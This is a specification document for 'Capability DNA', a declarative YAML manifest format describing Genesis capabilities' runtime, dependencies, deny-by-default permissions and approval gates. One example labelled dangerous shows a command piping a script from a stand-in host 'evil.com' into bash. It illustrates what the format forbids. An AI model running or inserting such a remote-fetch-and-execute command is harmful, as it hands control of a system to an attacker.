## Overview

**Capability DNA** is the declarative specification format for Genesis capabilities. It describes **what a capability needs**, not **how** to execute it.

### Core Concept

```
Capability DNA (YAML manifest)
  ↓
Describes: resources, permissions, dependencies, requirements
  ↓
Interpreted by: trusted ExecutionBackend
  ↓
NOT: arbitrary shell commands executed directly
```

### Why Declarative?

**Security**: Prevents capability manifests from becoming remote code execution interfaces.

**Example of what we DON'T do**:
```yaml
# ❌ DANGEROUS - Imperative shell commands
lifecycle:
  run: "curl evil.com/script.sh | bash"
```

**Example of what we DO**:
```yaml
# ✅ SAFE - Declarative resource specification
runtime:
  type: python
  entrypoint: hello.main:greet

permissions:
  network:
    outbound: false  # Capability cannot access network
```

## Design Principles

### 1. Declarative, Not Imperative

Capability DNA describes resources and constraints. The ExecutionBackend interprets and controls execution.

### 2. Deny-by-Default

All permissions default to `false`. Capabilities must explicitly request what they need.

### 3. Human-Readable

YAML format with clear structure. Anyone should be able to understand a capability's requirements by reading its DNA.

### 4. Machine-Validatable

JSON Schema validation ensures structural correctness before execution.

### 5. Provenance-Tracked

Every capability records its origin for auditing and lineage tracking.

### 6. Evolution-Friendly

Schema designed for future extensions without breaking existing capabilities.

## Manifest Structure

```yaml
apiVersion: genesis.cognitiveos.dev/v1alpha1
kind: Capability

metadata:
  name: <string>
  version: <semver>
  description: <string>
  
  provenance:
    createdBy: <HUMAN | GENESIS | IMPORTED>
    createdAt: <ISO 8601 timestamp>
    parentCapabilities: <list of capability references>

spec:
  type: <simple | composite | service>
  
  runtime:
    type: <python | ...>
    entrypoint: <module:function>
  
  requirements:
    python: <version constraint>
  
  dependencies:
    capabilities: <list>
    models: <list>
  
  permissions:
    filesystem:
      read: <boolean>
      write: <boolean>
    network:
      outbound: <boolean>
    process:
      spawn: <boolean>
  
  evaluation:
    tests: <list>
    approval_gates: <list>
```

## Field Specifications

### apiVersion

**Type**: string  
**Required**: Yes  
**Format**: `genesis.cognitiveos.dev/v1alpha1`

**Purpose**: Schema versioning for forward compatibility.

### kind

**Type**: string  
**Required**: Yes  
**Value**: `Capability`

**Purpose**: Resource type identification (future: multiple resource kinds).

### metadata

#### metadata.name

**Type**: string  
**Required**: Yes  
**Format**: lowercase alphanumeric + hyphens, max 63 chars  
**Pattern**: `^[a-z0-9]([-a-z0-9]*[a-z0-9])?$`

**Examples**:
- `hello-world`
- `aws-security-auditor`
- `data-transformer-v2`

#### metadata.version

**Type**: string  
**Required**: Yes  
**Format**: Semantic versioning (MAJOR.MINOR.PATCH)  
**Pattern**: `^\d+\.\d+\.\d+$`

**Examples**:
- `0.1.0`
- `1.2.3`
- `2.0.0-beta.1` (future: pre-release tags)

#### metadata.description

**Type**: string  
**Required**: Yes  
**Max length**: 256 characters

**Purpose**: Human-readable capability summary.

#### metadata.provenance

**Type**: object  
**Required**: Yes

##### provenance.createdBy

**Type**: enum  
**Required**: Yes  
**Values**:
- `HUMAN`: Created manually by a human developer
- `GENESIS`: Generated by Genesis itself
- `IMPORTED`: Imported from external source

**NOT a free string** - prevents arbitrary values like `"pepe123"`.

**Purpose**: Origin tracking for auditing and recursive analysis.

##### provenance.createdAt

**Type**: string  
**Required**: Yes  
**Format**: ISO 8601 timestamp with timezone  
**Example**: `2026-09-23T10:30:00Z`

##### provenance.parentCapabilities

**Type**: array of strings  
**Required**: Yes (can be empty)  
**Format**: Each element is `<name>@<version>`

**Examples**:
```yaml
parentCapabilities: []  # No parents (leaf capability)
parentCapabilities:
  - aws-discovery@1.2.0
  - security-analyzer@2.0.1  # Composed from these
```

**Purpose**: Tracks capability lineage for composition and evolution.

### spec

#### spec.type

**Type**: enum  
**Required**: Yes  
**Values**:
- `simple`: Single-purpose, non-composite capability
- `composite`: Composed from other capabilities (v0.2+)
- `service`: Long-running service capability (future)

**v0.1**: Only `simple` is supported.

#### spec.runtime

**Type**: object  
**Required**: Yes

##### runtime.type

**Type**: enum  
**Required**: Yes  
**Values** (v0.1):
- `python`

**Future**: `node`, `binary`, `container`, etc.

##### runtime.entrypoint

**Type**: string  
**Required**: Yes  
**Format**: `<module>:<function>` or `<module>:<class>.<method>`

**Examples**:
- `hello_capability.main:greet`
- `aws_auditor.analyzer:SecurityAnalyzer.run`

**Purpose**: Tells ExecutionBackend how to invoke the capability.

**Critical**: This is NOT a shell command. It's a structured reference interpreted by the runtime.

#### spec.requirements

**Type**: object  
**Required**: No

##### requirements.python

**Type**: string  
**Required**: No (if runtime.type = python)  
**Format**: PEP 440 version specifier

**Examples**:
- `">=3.11"`
- `">=3.11,<4.0"`
- `"==3.12.*"`

#### spec.dependencies

**Type**: object  
**Required**: No

##### dependencies.capabilities

**Type**: array of strings  
**Format**: `<name>@<version>` or `<name>@>=<version>`

**Examples**:
```yaml
capabilities:
  - data-parser@1.0.0
  - text-analyzer@>=2.0.0
```

**v0.1 Behavior**:
- Declaration supported
- Missing dependency validation
- Self-reference detection
- Simple cycle detection
- NO complex resolution (deferred to v0.2)

##### dependencies.models

**Type**: array of objects (future)

**v0.1**: Not implemented.

#### spec.permissions

**Type**: object  
**Required**: Yes

**Default Behavior**: All permissions default to most restrictive value (false/none).

##### permissions.filesystem

**Type**: object

###### filesystem.read

**Type**: boolean  
**Default**: `false`

**Meaning**: Capability may read files.

###### filesystem.write

**Type**: boolean  
**Default**: `false`

**Meaning**: Capability may write/modify files.

**v0.1 Limitation**: Declaration only. SubprocessBackend does NOT enforce at OS level.

##### permissions.network

**Type**: object

###### network.outbound

**Type**: boolean  
**Default**: `false`

**Meaning**: Capability may make outbound network requests.

**v0.1 Limitation**: Declaration only. SubprocessBackend does NOT enforce at OS level.

##### permissions.process

**Type**: object

###### process.spawn

**Type**: boolean  
**Default**: `false`

**Meaning**: **Capability code cannot spawn child processes.**

**Critical Distinction**:
```
Genesis Runtime
  ↓
  CAN create subprocess to execute capability (runtime authority)

Capability Code
  ↓
  CANNOT spawn child processes if process.spawn: false
```

**NOT**: "Genesis cannot use SubprocessBackend"  
**BUT**: "Capability cannot call subprocess.Popen() or equivalent"

**v0.1 Limitation**: Declaration only. No enforcement mechanism.

#### spec.evaluation

**Type**: object  
**Required**: Yes

##### evaluation.tests

**Type**: array of objects

**Structure**:
```yaml
tests:
  - type: unit
    path: tests/unit
  - type: integration
    path: tests/integration
```

**Fields**:
- `type`: Test category (unit, integration, security, etc.)
- `path`: Relative path to test directory

##### evaluation.approval_gates

**Type**: array of objects  
**Required**: Yes

**v0.1 Structure**:
```yaml
approval_gates:
  - type: human
    required: true
    reason: "Manual verification required for v0.1"
```

**v0.1 Behavior**: Human approval always required.

**Future**: Policy-based gates, risk assessment, automated approval.

## Examples

### Minimal Capability

```yaml
apiVersion: genesis.cognitiveos.dev/v1alpha1
kind: Capability

metadata:
  name: hello-world
  version: 0.1.0
  description: "Simple greeting capability"
  
  provenance:
    createdBy: HUMAN
    createdAt: "2026-09-23T10:00:00Z"
    parentCapabilities: []

spec:
  type: simple
  
  runtime:
    type: python
    entrypoint: hello.main:greet
  
  requirements:
    python: ">=3.11"
  
  dependencies:
    capabilities: []
  
  permissions:
    filesystem:
      read: false
      write: false
    network:
      outbound: false
    process:
      spawn: false
  
  evaluation:
    tests:
      - type: unit
        path: tests/unit
    approval_gates:
      - type: human
        required: true
```

### Capability with Dependencies (v0.2+)

```yaml
apiVersion: genesis.cognitiveos.dev/v1alpha1
kind: Capability

metadata:
  name: aws-security-auditor
  version: 1.0.0
  description: "Audits AWS account security configuration"
  
  provenance:
    createdBy: GENESIS
    createdAt: "2026-09-23T15:30:00Z"
    parentCapabilities:
      - aws-discovery@1.2.0
      - security-analyzer@2.0.1

spec:
  type: composite
  
  runtime:
    type: python
    entrypoint: aws_auditor.main:AWSSecurityAuditor.audit
  
  requirements:
    python: ">=3.11"
  
  dependencies:
    capabilities:
      - aws-discovery@1.2.0
      - security-analyzer@2.0.1
  
  permissions:
    filesystem:
      read: true   # Read AWS credentials
      write: true  # Write audit reports
    network:
      outbound: true  # Call AWS APIs
    process:
      spawn: false
  
  evaluation:
    tests:
      - type: unit
        path: tests/unit
      - type: integration
        path: tests/integration
      - type: security
        path: tests/security
    approval_gates:
      - type: human
        required: true
        reason: "Accesses cloud credentials and makes network calls"
```

## Validation

### JSON Schema

Capability DNA is validated against: `schemas/capability.schema.json`

**Validation Performed**:
1. **Schema conformance**: All required fields present, correct types
2. **Semantic validation**: Name format, version format, entrypoint format
3. **Dependency validation**: No self-references, valid dependency names
4. **Permission validation**: Valid permission values

### Validation Failure Examples

```yaml
# ❌ Invalid name (uppercase not allowed)
metadata:
  name: HelloWorld  # Must be: hello-world
```

```yaml
# ❌ Invalid version
metadata:
  version: 1.0  # Must be: 1.0.0 (semantic versioning)
```

```yaml
# ❌ Self-reference
metadata:
  name: my-capability
  version: 1.0.0
dependencies:
  capabilities:
    - my-capability@1.0.0  # Cannot depend on self
```

```yaml
# ❌ Invalid entrypoint
runtime:
  entrypoint: "python main.py"  # Must be: module:function
```

```yaml
# ❌ Shell command (not allowed)
runtime:
  command: "bash run.sh"  # No arbitrary commands
```

## Future Extensions

### Planned Schema Extensions

**v0.2** (Composition):
```yaml
spec:
  composition:
    strategy: sequential | parallel | conditional
    capabilities:
      - name: step-1
        ref: parser@1.0.0
      - name: step-2
        ref: analyzer@2.0.0
```

**v0.4** (Model Requirements):
```yaml
spec:
  dependencies:
    models:
      - provider: anthropic
        model: claude-sonnet-4.5
        purpose: planning
        fallback: claude-haiku-4.0
```

**v0.6** (Advanced Permissions):
```yaml
spec:
  permissions:
    filesystem:
      read:
        paths: ["./data/*.json"]
      write:
        paths: ["./output/*.csv"]
    network:
      outbound:
        domains: ["api.github.com"]
        protocols: ["https"]
```

**v0.7** (Resource Limits):
```yaml
spec:
  resources:
    memory_mb: 512
    cpu_cores: 1.0
    timeout_seconds: 300
```

### Backward Compatibility

Schema changes will maintain backward compatibility through:
- **apiVersion** field (e.g., v1alpha1 → v1alpha2 → v1)
- Optional fields for new features
- Deprecated field warnings (not errors)
- Migration tooling

## Best Practices

### 1. Principle of Least Privilege

Request only the permissions absolutely necessary:

```yaml
# ❌ Overpermissive
permissions:
  filesystem:
    read: true
    write: true
  network:
    outbound: true

# ✅ Minimal
permissions:
  filesystem:
    read: false
    write: false
  network:
    outbound: false
```

### 2. Semantic Versioning

Follow semver strictly:
- **MAJOR**: Breaking changes
- **MINOR**: New features (backward compatible)
- **PATCH**: Bug fixes

### 3. Descriptive Names

Use clear, meaningful names:

```yaml
# ❌ Unclear
name: cap1

# ✅ Clear
name: aws-security-auditor
```

### 4. Document Provenance

Always include accurate provenance:

```yaml
provenance:
  createdBy: GENESIS
  createdAt: "2026-09-23T10:30:00Z"
  parentCapabilities:
    - parent-capability@1.0.0
```

### 5. Test Coverage

Specify comprehensive tests:

```yaml
evaluation:
  tests:
    - type: unit
      path: tests/unit
    - type: integration
      path: tests/integration
    - type: security  # Don't skip security tests
      path: tests/security
```

## Security Considerations

### What DNA Does NOT Control

**Critical Understanding**: In v0.1, Capability DNA permission declarations are **policy statements**, not OS-level enforcement.

**SubprocessBackend Limitations**:
- ❌ Cannot enforce filesystem read/write restrictions
- ❌ Cannot enforce network access restrictions
- ❌ Cannot prevent process spawning

**Why Declare Permissions Then?**:
1. **Documentation**: Clear statement of intent
2. **Governance**: Approval gates can review permissions
3. **Future Enforcement**: Hardened backends will enforce
4. **Audit Trail**: Recorded in artifact provenance

### Safe Capability Checklist

Before requesting approval:
- [ ] Minimal permissions requested
- [ ] No unnecessary dependencies
- [ ] Clear provenance
- [ ] Comprehensive tests
- [ ] Entrypoint is structured reference (not shell command)
- [ ] Description accurately reflects behavior
